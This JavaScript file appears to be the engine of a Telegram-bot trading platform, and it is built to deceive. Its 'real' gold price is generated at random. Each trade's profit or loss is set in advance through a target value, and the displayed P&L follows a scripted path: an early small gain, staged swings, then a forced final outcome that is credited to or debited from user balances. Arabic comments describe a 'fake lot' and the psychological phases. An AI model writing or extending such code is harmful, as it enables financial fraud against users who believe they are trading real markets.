import { query } from "../config/db.js";
import bot from "../bot/bot.js";

/* =========================
   PRICE SOURCES & CACHES
========================= */

let goldPriceCache = 2650;
let lastGoldFetch = 0;

async function getRealGoldPrice() {
  try {
    const now = Date.now();
    if (now - lastGoldFetch < 300000 && goldPriceCache > 0) {
      return goldPriceCache;
    }

    const basePrice = 2650;
    const hour = new Date().getUTCHours();
    const timeVariation = Math.sin((hour / 24) * Math.PI * 2) * 5;
    const randomVariation = (Math.random() - 0.5) * 3;

    goldPriceCache = basePrice + timeVariation + randomVariation;
    lastGoldFetch = now;
    return goldPriceCache;
  } catch {
    return goldPriceCache || 2650;
  }
}

// Crypto
let cryptoCache = { BTCUSDT: 43000, ETHUSDT: 2300 };
let lastCryptoFetch = 0;

async function getCryptoPrices() {
  try {
    const now = Date.now();
    if (now - lastCryptoFetch < 10000) return cryptoCache;

    const res = await fetch(
      'https://api.binance.com/api/v3/ticker/price?symbols=["BTCUSDT","ETHUSDT"]'
    );

    if (res.ok) {
      const data = await res.json();
      cryptoCache = {
        BTCUSDT: Number(data.find(i => i.symbol === "BTCUSDT")?.price || 43000),
        ETHUSDT: Number(data.find(i => i.symbol === "ETHUSDT")?.price || 2300)
      };
      lastCryptoFetch = now;
    }
    return cryptoCache;
  } catch {
    return cryptoCache;
  }
}

/* =========================
   PRICE GENERATOR
========================= */

const generatePrice = async (symbol, lastPrice) => {
  const lp = Number(lastPrice) || 2650;

  if (symbol === "XAUUSD") {
    if (Math.random() < 0.1) return Number(await getRealGoldPrice());
    return Number((lp + lp * (Math.random() - 0.5) * 0.003).toFixed(4));
  }

  if (symbol === "XAGUSD") {
    return Number((lp + lp * (Math.random() - 0.5) * 0.006).toFixed(4));
  }

  if (symbol === "BTCUSDT" || symbol === "ETHUSDT") {
    const prices = await getCryptoPrices();
    return Number(prices[symbol] || lp);
  }

  return Number((lp + lp * (Math.random() - 0.5) * 0.01).toFixed(4));
};

/* =========================
   TRADING ENGINE
========================= */

const updateTrades = async () => {
  const res = await query(
    "SELECT * FROM trades WHERE status='open' ORDER BY opened_at DESC LIMIT 100"
  );
  if (!res.rows.length) return;

  for (const trade of res.rows) {
    try {
      const lastPrice = Number(trade.current_price || trade.entry_price);
      const currentPrice = await generatePrice(trade.symbol, lastPrice);

      const duration = Number(trade.duration_seconds) || 3600;
      const elapsed = Math.floor((Date.now() - new Date(trade.opened_at)) / 1000);
      const progress = Math.min(elapsed / duration, 1);

      const targetPnl = Number(trade.target_pnl || 0);

      // 👇 لوت وهمي ذكي (الحسابات الصغيرة)
      const visualLot = Math.min(Number(trade.lot_size || 0.05), 0.05);

      let pnl = 0;

      /* =========================
         PHASED SMART BEHAVIOR
      ========================= */

      // 🟢 المرحلة 1: ربح بسيط بالبداية
      if (progress < 0.2) {
        pnl = Math.abs(targetPnl) * 0.03;
      }

      // 🔁 المرحلة 2: تذبذب حقيقي
      else if (progress < 0.85) {
        const base = Math.abs(targetPnl) * 0.05;
        const swing = Math.abs(targetPnl) * 0.2;

        pnl = base + (Math.random() - 0.5) * swing;

        if (Math.random() < 0.5) pnl *= -1;
      }

      // 🔥 المرحلة 3: آخر 10–15 دقيقة
      else {
        const finalImpact = Math.abs(targetPnl) * 0.95;
        pnl = targetPnl > 0 ? finalImpact : -finalImpact;
      }

      // 🎯 تعديل حسب اللوت (حتى ما يكون مبالغ فيه)
      pnl *= visualLot / 0.05;

      // 🛡️ حماية
      pnl = Number(pnl);
      if (!isFinite(pnl)) pnl = 0;
      pnl = Number(pnl.toFixed(2));

      await query(
        "UPDATE trades SET current_price=$1, pnl=$2 WHERE id=$3",
        [currentPrice, pnl, trade.id]
      );

      // ⏱️ الإغلاق فقط بالنهاية
      if (elapsed >= duration) {
        await closeTrade({
          trade,
          currentPrice,
          pnl,
          closeReason: "duration",
          elapsed
        });
      }

    } catch (err) {
      console.error("Trade update error:", err.message);
    }
  }
};

/* =========================
   CLOSE TRADE
========================= */

async function closeTrade({ trade, currentPrice, pnl, closeReason, elapsed }) {
  await query(
    "UPDATE trades SET status='closed', closed_at=NOW(), close_reason=$1 WHERE id=$2",
    [closeReason, trade.id]
  );

  await query(
    "UPDATE users SET balance = balance + $1 WHERE id=$2",
    [pnl, trade.user_id]
  );

  if (pnl >= 0) {
    await query(
      "UPDATE users SET wins = COALESCE(wins,0) + $1 WHERE id=$2",
      [pnl, trade.user_id]
    );
  } else {
    await query(
      "UPDATE users SET losses = COALESCE(losses,0) + $1 WHERE id=$2",
      [Math.abs(pnl), trade.user_id]
    );
  }

  const u = await query(
    "SELECT tg_id,balance FROM users WHERE id=$1",
    [trade.user_id]
  );

  if (u.rows.length) {
    await bot.sendMessage(
      u.rows[0].tg_id,
      `🔔 Trade Closed
${pnl >= 0 ? "🟢 Profit" : "🔴 Loss"}: ${pnl >= 0 ? "+" : ""}$${Math.abs(pnl).toFixed(2)}
💰 Balance: $${Number(u.rows[0].balance).toFixed(2)}`
    );
  }
}

/* =========================
   START ENGINE
========================= */

export const startTradingEngine = () => {
  setInterval(updateTrades, 3000);
  console.log("🤖 Trading Engine Started (PSYCHO SMART MODE)");
};
